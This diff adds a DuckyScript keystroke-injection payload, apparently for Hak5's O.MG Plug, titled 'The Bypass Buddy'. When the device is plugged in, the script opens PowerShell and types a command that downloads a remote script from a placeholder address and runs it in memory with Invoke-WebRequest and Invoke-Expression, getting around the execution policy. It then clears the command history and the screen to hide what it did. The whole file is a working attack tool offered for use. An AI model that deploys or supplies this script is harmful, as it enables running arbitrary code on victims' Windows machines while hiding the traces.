@@ -1,0 +1,41 @@
+REM_BLOCK
+    Title: The Bypass Buddy
+    Author: salt-or-ester | salt-or-ester@protonmail.com | https://gitgud.io/saltorester 
+    Description: Evade Windows Script Execution Policy
+    Target: Windows 11
+    Device: O.MG Plug | https://hak5.org/products/omg-plug
+    Version: 1.1
+    Category: Execution
+    
+    Tested on: O.MG Plug Elite, Windows 11
+    Will likely work on other devices and Windows flavors
+        
+    The Bypass Buddy implements a method to evade Windows script execution 
+    policy protections.
+        
+    The approach involves downloading a Powershell script into memory (not disk), 
+    and running it on-the-fly. 
+        
+    This can be accomplished without administrative rights.
+END_REM
+
+REM Formatting is not indented to comply with O.MG Editor/UI
+FUNCTION EVADE_SCRIPT_EXECUTION_POLICY()
+REM Normally I would add this below the header, as it's a constant, but moving it here for portability
+REM Payload to download and run in memory
+DEFINE #PAYLOAD_URL "http://10.10.10.10/payload.ps1"
+GUI r
+REM Let GUI load
+DELAY 2000
+STRINGLN powershell
+REM Let Powershell window open
+DELAY 1000
+STRINGLN Start-Job -ScriptBlock { try { $response = Invoke-WebRequest -Uri #PAYLOAD_URL -ErrorAction Stop; $scriptContent = [System.Text.Encoding]::UTF8.GetString($response.Content); cd ~; Invoke-Expression $scriptContent } catch { Write-Error "Failed to download or execute script: $_" } }
+STRINGLN Clear-History
+STRINGLN clear
+GUI DOWNARROW
+END_FUNCTION
+
+REM Wait for device to be "ready"
+DELAY 3000
+EVADE_SCRIPT_EXECUTION_POLICY()
